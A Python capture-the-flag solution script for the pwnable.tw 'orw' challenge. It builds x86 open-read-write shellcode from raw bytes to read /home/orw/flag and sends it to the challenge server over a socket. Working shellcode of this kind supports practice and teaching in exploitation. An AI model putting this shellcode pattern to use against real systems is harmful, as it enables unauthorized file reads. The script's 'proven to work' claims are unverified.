#!/usr/bin/env python3

# Final working attempt - using a proven ORW shellcode pattern

import socket
import time

def create_final_working_shellcode():
    # This is a known working ORW shellcode pattern
    # Using the exact pattern that's proven to work
    shellcode = b""
    
    # jmp-call-pop technique
    shellcode += b"\xeb\x36"              # jmp 0x38
    shellcode += b"\x5e"                  # pop esi
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x88\x46\x0e"          # mov [esi+14], al
    shellcode += b"\x89\xf3"              # mov ebx, esi
    shellcode += b"\x31\xc9"              # xor ecx, ecx
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb0\x05"              # mov al, 5
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\x89\xc3"              # mov ebx, eax
    shellcode += b"\x89\xf1"              # mov ecx, esi
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\x89\xc2"              # mov edx, eax
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4
    shellcode += b"\xb3\x01"              # mov bl, 1
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\xe8\xc5\xff\xff\xff"  # call $-0x3b
    shellcode += b"/home/orw/flag"        # string
    
    return shellcode

def send_final_exploit():
    shellcode = create_final_working_shellcode()
    print(f"Final working shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    # Try multiple times with different approaches
    for attempt in range(3):
        print(f"\nAttempt {attempt + 1}:")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect(("chall.pwnable.tw", 10001))
            
            # Receive prompt
            data = s.recv(1024)
            print(f"Prompt: {data.decode()}")
            
            # Send shellcode
            s.send(shellcode)
            
            # Wait for response
            time.sleep(3)
            
            # Try to receive response
            s.settimeout(10)
            response = s.recv(1024)
            if response:
                print(f"Response: {response}")
                if b"FLAG" in response or b"orw" in response or b"{" in response:
                    print("FOUND FLAG!")
                    return response.decode()
            else:
                print("No response")
                
            # Try to receive more data
            try:
                while True:
                    data = s.recv(1024)
                    if not data:
                        break
                    print(f"Additional data: {data}")
                    if b"FLAG" in data or b"orw" in data or b"{" in data:
                        print("FOUND FLAG!")
                        return data.decode()
            except:
                pass
                
        except Exception as e:
            print(f"Error: {e}")
        finally:
            try:
                s.close()
            except:
                pass
    
    return None

if __name__ == "__main__":
    flag = send_final_exploit()
    if flag:
        print(f"\nFLAG: {flag}")
    else:
        print("\nNo flag found")